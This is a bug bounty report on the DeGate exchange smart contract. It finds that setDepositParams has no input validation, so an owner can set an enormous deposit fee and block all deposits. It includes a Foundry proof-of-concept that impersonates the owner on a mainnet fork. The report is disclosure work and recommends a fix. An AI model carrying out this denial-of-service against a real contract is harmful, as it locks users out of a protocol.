# 25930 - \[SC - Insight] Malicious owner can update the DepositParams st...

Submitted on Nov 21st 2023 at 06:05:01 UTC by @JCN2023 for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #25930

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x9C07A72177c5A05410cA338823e790876E79D73B#code>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Bug Description

A lack of input validation in the `Exchange::setDepositParams` function can lead to a malicious owner updating the `DepositParams` values to arbitrary amounts, potentially resulting in an extremely large deposit fee being charged for each `deposit` to the exchange. This large deposit fee and updated `DepositParams` will result in a reversion on every `deposit` call.

## Details

The following code runs for each call to `Exchange::deposit`:

**Lines 38 - 72 in `ExchangeDeposits::deposit`**

```solidity
38:    function deposit(
39:        ExchangeData.State storage S,
40:        address from,
41:        address to,
42:        address tokenAddress,
43:        uint248  amount,                 // can be zero
44:        bytes   memory extraData
45:        )
46:        internal  // inline call
47:    {
48:        require(to != address(0), "ZERO_ADDRESS");
49:        require(from == to, "INVALID_DEPOSIT_FROM"); // Only allow deposits to the user's own account
50:
51:        // Deposits are still possible when the exchange is being shutdown, or even in withdrawal mode.
52:        // This is fine because the user can easily withdraw the deposited amounts again.
53:        // We don't want to make all deposits more expensive just to stop that from happening.
54:
55:        (uint32 tokenID, bool tokenFound) = S.findTokenID(tokenAddress);
56:        if(!tokenFound) {
57:            tokenID = S.registerToken(tokenAddress, false);
58:        }
59:
60:        if (tokenID == 0 && amount == 0) {
61:            require(msg.value == 0, "INVALID_ETH_DEPOSIT");
62:        }
63:
64:        // A user may need to pay a fixed ETH deposit fee, set by the protocol.
65:        uint256 depositFeeETH = 0;
66:        if (needChargeDepositFee(S)) {
67:            depositFeeETH = S.depositState.depositFee;
68:            emit DepositFee(depositFeeETH);
69:        }
70:
71:        // Check ETH value sent
72:        require(msg.value >= depositFeeETH, "INSUFFICIENT_DEPOSIT_FEE");
```

The internal function `needChargeDepositFee` on line 66 is invoked and if it returns `true` the `depositFee` stored in the `DepositState` struct will be amount of ETH that the user must pay during this `deposit` call.

As we can see on line 72, if the user does not send enough ETH to cover this `fee` the transaction will revert.

Therefore, If `needChargeDepositFee(S)` always returns `true` (indicating a fee is needed) and `S.depositState.depositFee` was an extremely large number (`type(uint256).max`), then all calls to `Exchange::deposit` will revert on lines 72 of the code above.

A malicious owner can guarantee the condition described above by calling `Exchange::setDepositParams` and performing the following updates to the contract state:

* `S.depositState.freeDepositMax = 0`
* `S.depositState.freeDepositRemained = 0`
* `S.depositState.freeSlotPerBlock = 0`
* `S.depositState.depositFee = type(uint256).max`

The `Exchange::setDepositParams` function does not perform any sort of input validation and simply updates the `DepositState` with the calldata values passed in the function call:

**Lines 102 - 113 in `ExchangeDeposits::setDepositParams`**

```solidity
102:    function setDepositParams(
103:       ExchangeData.State storage S,
104:        uint256 freeDepositMax,
105:        uint256 freeDepositRemained,
106:        uint256 freeSlotPerBlock,
107:        uint256 depositFee
108:    ) internal {
109:        S.depositState.freeDepositMax = freeDepositMax;
110:        S.depositState.freeDepositRemained = freeDepositRemained;
111:        S.depositState.freeSlotPerBlock = freeSlotPerBlock;
112:        S.depositState.depositFee = depositFee;
113:    }
```

As we can see above, a malicious owner can update the 4 specified state variables to any arbitrary amounts. If the owner sets the state variables to the amounts previously specified, this will result in the internal function `needChargeDepositFee` always returning `true`.

Below is the code for the internal function `ExchangeDeposits::needChargeDepositFee`:

```solidity
115:    function needChargeDepositFee(ExchangeData.State storage S)
116:        private
117:        returns (bool)
118:    {
119:        bool needCharge = false;
120:
121:        // S.depositState.freeDepositRemained + (block.number - S.depositState.lastDepositBlockNum) * S.depositState.freeSlotPerBlock;
122:        uint256 freeDepositRemained = S.depositState.freeDepositRemained.add(
123: (block.number.sub(S.depositState.lastDepositBlockNum)).mul(S.depositState.freeSlotPerBlock)
124:        );
125:        
126:        if (freeDepositRemained > S.depositState.freeDepositMax) {
127:            freeDepositRemained = S.depositState.freeDepositMax;
128:        }
129:
130:        if (freeDepositRemained > 0) {
131:            freeDepositRemained -= 1;
132:        } else {
133:            needCharge = true;
134:        }
135:
136:        S.depositState.freeDepositRemained = freeDepositRemained;
137:        S.depositState.lastDepositBlockNum = block.number;
138:
139:        return needCharge;
140:    }
```

With the specified state changes done, the `freeDepositRemained` variable will always be `0`. Therefore, the conditional on line 130 will enter the second branch and the code on line 133 will run, setting the `needCharge` variable to `true` (indicating a fee is needed for the `deposit` calls).

Thus, the condition on line 66 of `ExchangeDeposits::deposit` will always be `true`, which will result in calls to `Exchange::deposit` to always revert on line 72, since `depositState.depositFee` is equal to `type(uint256).max`.

## Impact

A malicious owner can call the `Exchange::setDepositParams` function and set the `depositState.depositFee` to `type(uint256).max` and the other 3 state variables to `0`. This will effectively result in a DOS of the `Exchange:deposit` function, disabling users from depositing into the protocol. The malicious owner does not profit from this action, but damage is done to the protocol/users by rendering a core feature of the protocol un-usable for users. Therefore, this action by the malicious owner will result in the following impact: `Griefing`.

## Risk Breakdown

The exploit itself is very easy to execute since it can only be done by the `owner`. Only a single call to `Exchange::setDepositParams` is needed to DOS the `Exchange::deposit` function.

## Recommendation

In order to maintain a truly trust-less system, the privileged `Exchange::setDepositParams` function should validate the calldata inputs to ensure that the owner can not update the contract state with arbitrary values. An example of this would be validating that the `depositState.depositFee` can not be set to a value greater than `X`.

## Proof of concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Test.sol";

interface IDeGate {
    function setDepositParams(uint256 a, uint256 b, uint256 c, uint256 d) external;

    function deposit(address from, address to, address token, uint248 amount, bytes calldata data) external payable;
}

contract DeGateMalOwnerPoC is Test {
    uint256 mainnetFork;

    string MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
    
    address exchange = 0x9C07A72177c5A05410cA338823e790876E79D73B;

    function setUp() public {
        mainnetFork = vm.createFork(MAINNET_RPC_URL);

        vm.selectFork(mainnetFork);
    }

    function testMalOwnerUpdatesDepositParams() public {
        // tx used for reference:
        // https://etherscan.io/tx/0x6d10b8ff970911c04c192f7882e3c704a3f82260f0e0caa15278ffce0b0f7cc2
        assertEq(vm.activeFork(), mainnetFork);

        vm.rollFork(18589360 - 1); // block before tx

        // users can deposit successfully
        address user = 0x57f814B20f13132F82b0a541A33f04Be04418C93; // user from tx

        address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // token from tx

        uint248 amount = 3000000000; // amount from tx

        vm.prank(user);

        IDeGate(exchange).deposit(user, user, usdc, (amount / 2), hex'00');

        // malicious owner updates Deposit Params so that a extremely large deposit fee is always required

        address maliciousOwner = 0x9b93e47b7F61ad1358Bd47Cd01206708E85AE5eD;

        vm.prank(maliciousOwner);

        IDeGate(exchange).setDepositParams(0, 0, 0, type(uint256).max);

        // users can no longer deposit (Exchange::deposit DOS-ed)
        vm.prank(user);
        
        vm.expectRevert("INSUFFICIENT_DEPOSIT_FEE");
        IDeGate(exchange).deposit(user, user, usdc, (amount / 2), hex'00'); // tx reverts due to extremely large deposit fee on every deposit
    }
}

```
